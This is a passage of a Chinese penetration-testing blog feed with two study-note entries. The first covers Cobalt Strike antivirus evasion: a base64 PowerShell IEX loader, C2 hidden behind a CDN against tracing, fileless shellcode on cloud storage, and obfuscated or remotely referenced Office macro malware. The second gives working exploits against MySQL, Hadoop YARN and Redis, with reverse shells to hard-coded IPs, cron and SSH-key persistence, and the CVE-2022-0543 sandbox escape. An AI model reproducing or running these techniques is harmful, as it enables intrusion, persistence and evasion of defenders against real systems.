class=&#34;language-bash&#34;&gt;xx1=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&lt;span class=&#34;variable&#34;&gt;$x1&lt;/span&gt;))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;xx2=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&lt;span class=&#34;variable&#34;&gt;$x2&lt;/span&gt;))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;xx3=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&lt;span class=&#34;variable&#34;&gt;$x3&lt;/span&gt;))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;xxx=&lt;span class=&#34;variable&#34;&gt;$xx1&lt;/span&gt;+&lt;span class=&#34;variable&#34;&gt;$xx2&lt;/span&gt;+&lt;span class=&#34;variable&#34;&gt;$xx3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;If ([IntPtr]::size -eq 8) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  start-job &amp;#123; param($a) IEX $a &amp;#125; -RunAs32 -Argument $xxx | wait-job | Receive-Job&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  IEX $xxx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;改变生成 C shellcode 的逻辑 直接 base 64 编码&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public static byte[] toC(byte[] var0) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Packer var1 = new Packer();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  var1.addString(&amp;quot;/* length: &amp;quot; + var0.length + &amp;quot; bytes */\n&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  var1.addString(&amp;quot;unsigned char buf[] = \&amp;quot;&amp;quot; + CommonUtils.bString(toVeil(var0)) + &amp;quot;\&amp;quot;;\n&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return var1.getBytes();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;防朔源&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#防朔源&#34;&gt;#&lt;/a&gt; 防朔源&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;CDN 节点防拉黑 ip&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;域名注册商：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZy5nb2RhZGR5LmNvbS8=&#34;&gt;https://sg.godaddy.com/&lt;/span&gt;&lt;br&gt;
cdn 解析商：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kYXNoLmNsb3VkZmxhcmUuY29tLw==&#34;&gt;https://dash.cloudflare.com/&lt;/span&gt;&lt;br&gt;
c2 模板：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3RocmVhdGV4cHJlc3MvbWFsbGVhYmxlLWMy&#34;&gt;https://github.com/threatexpress/malleable-c2&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（ 1 ）前期准备&lt;/p&gt;
&lt;p&gt;申请 godaddy 域名、配置 cloudflare、添加解析记录，指向 CS 的 IP、配置 DNS 服务器，使用 cloudflare、下载 C2 文件模版，修改配置并上传、启动 CS 加载 CS 模版，使用 stag 生成&lt;/p&gt;
&lt;p&gt;（ 2 ）因为 cloudflare 的原因这里端口的设置需要注意以下：&lt;/p&gt;
&lt;p&gt;若是 http，则只能设置 80,8080,8880,2052,2082,2086,2095 这些端口号&lt;br&gt;
若是 https，则只能设置 443,2053,2083,2087,2096,8443 这些端口号&lt;/p&gt;
&lt;p&gt;（ 3 ）cs 后门生成使用 Stageless 模式&lt;/p&gt;
&lt;p&gt;依次生成后门，如果对方进行朔源，拉黑的 ip 将会是域名解析的 cdn ip&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;修改 cs 的 SSL 证书&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（ 1 ）配置 SSL 设置&lt;/p&gt;
&lt;p&gt;创建证书（SSL - 源服务器）、设置页面规则 (缓存级别 - 绕过)、保存 CSR &amp;amp; 密匙 (server.pem&amp;amp;server.key)&lt;/p&gt;
&lt;p&gt;（ 2 ）生成证书文件&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;openssl pkcs12 -export -in server.pem -inkey server.key -out [http://www.yaosese.](http://www.yaosese.) xyz.p12 -name [http://www.yaosese.xyz](http://www.yaosese.xyz) -passout pass:123456&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkey store [http://www.yaosese.xyz.store](http://www.yaosese.xyz.store) -srckeystore [http://www.yaosese.xyz.p12](http://www.yaosese.xyz.p12) -srcstoretype PK CS12 -srcstorepass 123456 -alias [http://www.yaosese.xyz](http://www.yaosese.xyz)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 3 ）修改 teamserver&lt;/p&gt;
&lt;p&gt;证书指向：www.yaosese.xyz.store&lt;br&gt;
 证书密码： 123456&lt;/p&gt;
&lt;p&gt;（ 4 ）启动 teamserver&lt;/p&gt;
&lt;p&gt;./teamserver ip pass jquery-c2.4.5.profile&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OSS 存储 shellcode&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;将 shellcode 编码后存储在 oss 上，是安全的标志，可以进行免杀的无文件落地。云上开启 OSS 对象存储、创建 Bucket 列表、设置 Bucket 属性、上传 Shellcode 文件、获取地址 &amp;amp; 代码加载&lt;/p&gt;
&lt;h4 id=&#34;office套件宏病毒&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#office套件宏病毒&#34;&gt;#&lt;/a&gt; office 套件宏病毒&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;本地宏引用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过 cs 生成宏代码，打开 office 的选项，增加开发工具，新增宏为上线代码。存储为 97 - 23.doc 或者 docm、并且在首次打开 word 时启用宏可以上线。但是此宏会被杀毒软件自动清除，所以需要进行免杀，否则无法上线。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;本地宏引用 工具混淆&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;https://github.com/outflanknl/EvilClippy&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EvilClippy -s 1.vba xd.doc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Sub Hello()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Dim X&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X=MsgBox(&amp;quot;Hello VBS&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;本地宏引用 混淆 VBA&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;VBA代码助手 macro_pack&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BadAssMacrosx-i payload.bin -w doc -p no -s classic -c 5 -o 1.vba&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/lgzcarson/Payloads/blob/3066615cde55f9cd6755ed81a7d83c229f78e397/Methodology%20and%20Resources/Office%20-%20Attacks.md&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;远程宏引用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;将 docm 宏存储在远程 oss 或者 github 上，用带模板的 docx 通过修改 settings.xml 来指向远程宏木马所在的位置。&lt;br&gt;
（ 1 ）制作包含宏的恶意模版文件（.docm），注意用 EvilClippy 做一层免杀。&lt;br&gt;
（ 2 ）将恶意模版文件上传至服务器。如 Github、OSS 等公共文件平台。&lt;br&gt;
（ 3 ）新建并保存一个使用任意模版的 docx 文件。改 docx 后缀为 zip，解压 docx 文件，修改 word_rels\settings.xml.rels 文件的 Target 属性，将其指向部署恶意模版文件的服务器。&lt;br&gt;
（ 4 ）使用 zip 格式压缩文件，并重新命名后缀为 docx。&lt;br&gt;
（ 5 ）重新打开 docx 文件，并启用宏。&lt;/p&gt;
</content>
        <category term="渗透测试" />
        <updated>2022-12-29T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2022/12/30/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/</id>
        <title>XD22 3 服务攻防</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2022/12/30/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/"/>
        <content type="html">&lt;h3 id=&#34;数据库安全&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据库安全&#34;&gt;#&lt;/a&gt; 数据库安全&lt;/h3&gt;
&lt;p&gt;注意各种漏洞的产生都与其版本和其相关配置是否安全有关&lt;/p&gt;
&lt;h4 id=&#34;mysql-未授权访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mysql-未授权访问&#34;&gt;#&lt;/a&gt; mysql 未授权访问&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;CVE-2012-2122 利用&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过此漏洞不断的访问 mysql，最终可以无需认证进入数据库，但 是这个是很早之前的漏洞了，基本上已经销声匿迹了。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;hadoop未授权-rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hadoop未授权-rce&#34;&gt;#&lt;/a&gt; hadoop 未授权 RCE&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target = &amp;#x27;http://123.58.236.76:31361/&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lhost = &amp;#x27;47.94.236.117&amp;#x27; # put your local host ip here, and listen at port 9999&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = target + &amp;#x27;ws/v1/cluster/apps/new-application&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;resp = requests.post(url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app_id = resp.json()[&amp;#x27;application-id&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = target + &amp;#x27;ws/v1/cluster/apps&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;application-id&amp;#x27;: app_id,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;application-name&amp;#x27;: &amp;#x27;get-shell&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;am-container-spec&amp;#x27;: &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;commands&amp;#x27;: &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#x27;command&amp;#x27;: &amp;#x27;/bin/bash -i &amp;gt; &amp;amp; /dev/tcp/%s/9999 0 &amp;gt; &amp;amp;1&amp;#x27; % lhost,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;application-type&amp;#x27;: &amp;#x27;YARN&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;requests.post(url, json=data)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;redis-写定时-写公钥&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#redis-写定时-写公钥&#34;&gt;#&lt;/a&gt; redis 写定时 写公钥&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;redis 写 Webshell&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用条件：Web目录权限可读写，需得到Web路径:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;config set dir /tmp #设置WEB写入目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;config set dbfilename 1.php #设置写入文件名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set test &amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot; #设置写入文件代码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bgsave #保存执行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;save #保存执行&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;写定时任务反弹 shell:&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用条件：允许异地登录，安全模式protected-mode处于关闭状态&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;config set dir /var/spool/cron&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set yy &amp;quot;\n\n\n* * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/47.94.236.117/5555 0&amp;gt;&amp;amp;1\n\n\n&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;config set dbfilename reverse_shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;save&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;写入 Linux ssh-key 公钥&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用条件：允许异地登录，Redis服务使用ROOT账号启动，安全模式protected-mode处于关闭状态，允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen -t rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo -e &amp;quot;\n\n&amp;quot;; cat /root/.ssh/id_rsa.pub; echo -e &amp;quot;\n\n&amp;quot; &amp;gt; /root/.ssh/key.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /root/.ssh/key.txt | redis-cli -h 118.31.57.214 -x set xxx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;config set dir /root/.ssh/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;config set dbfilename authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;save&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh -i /root/.ssh/id_rsa root@118.31.57.214&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;RCE 自动化利用脚本&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;https://github.com/vulhub/redis-rogue-getshell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python redis-master.py -r 123.58.236.76 -p 11820 -L 47.94.236.117 -P 8888 -f RedisModulesSDK/exp.so -c &amp;quot;id&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;沙箱绕过 RCE CVE-2022-0543 ：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;https://github.com/aodsec/CVE-2022-0543&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eval &amp;#x27;local io_l = package.loadlib(&amp;quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&amp;quot;, &amp;quot;luaopen_io&amp;quot;); local io = io_l(); local f = io.popen(&amp;quot;id&amp;quot;, &amp;quot;r&amp;quot;); local res = f:read(&amp;quot;*a&amp;quot;); f:close(); return res&amp;#x27; 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;此漏洞较新，当确认有 redis未授权时，用redis-cli连接进来，可以直接执行系统命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;influxdb-jwt伪造身份&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#influxdb-jwt伪造身份&#34;&gt;#&lt;/a&gt; influxdb jwt 伪造身份&lt;/h4&gt;
&lt;p&gt;influxdb 是一款著名的时序数据库，其使用 jwt 作为鉴权方式。在用户开启 了认证，但未设置参数 shared-secret 的情况下，jwt 的认证密钥为空字符串，此 时攻击者可以伪造任意用户身份在 influxdb 中执行 SQL 语句。&lt;/p&gt;
&lt;p&gt;漏洞复现地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2luZmx1eGRiL3VuYWNjLw==&#34;&gt;https://vulhub.org/#/environments/influxdb/unacc/&lt;/span&gt;&lt;/p&gt;
